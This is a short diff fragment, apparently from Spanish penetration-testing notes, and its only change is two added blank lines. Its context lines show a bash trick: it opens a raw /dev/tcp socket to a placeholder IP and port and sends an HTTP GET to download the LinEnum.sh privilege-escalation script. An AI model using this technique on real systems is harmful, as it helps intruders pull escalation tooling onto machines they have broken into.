@@ -21,3 +21,5 @@ exec 3<>/dev/tcp/IP/PUERTO
 decargamos via get:
 echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 
+
+
